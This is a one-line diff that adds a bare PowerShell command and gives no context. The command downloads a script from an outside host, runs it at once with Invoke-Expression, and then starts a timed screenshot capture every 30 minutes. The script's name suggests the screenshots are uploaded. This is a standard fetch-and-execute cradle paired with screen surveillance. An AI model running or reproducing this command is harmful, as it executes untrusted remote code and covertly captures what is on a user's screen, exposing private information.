@@ -1,0 +1,1 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $code = $wc.DownloadString('https://catss.my.id/8/Get-TimedScreenshotUpload.ps1'); iex $code; Get-TimedScreenshot -Path 'C:\temp\shots' -Interval 1800 -EndTime '23:59' -Verbose
